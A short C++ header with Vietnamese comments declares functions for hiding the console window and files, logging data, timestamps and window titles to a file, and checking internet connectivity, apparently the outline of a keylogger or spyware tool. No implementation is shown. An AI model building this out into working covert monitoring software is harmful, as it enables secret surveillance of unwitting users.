#pragma once
#include "common.h"

// Lấy đường dẫn an toàn cho file
std::string GetSecurePath(const std::string& filename);

// Ẩn cửa sổ console
void HideWindow();

// Thiết lập tên file
bool SetFileNames();

// Ghi dữ liệu vào file log
void Write(std::string data);

// Ghi thời gian vào file log
void LogTime();

// Ghi tiêu đề cửa sổ vào file log
void LogWindowTitle();

// Ẩn file
void Hide(std::string file);

// Ẩn tất cả các file
void HideFiles();

// Kiểm tra kết nối internet
bool IsConnectedToInternet();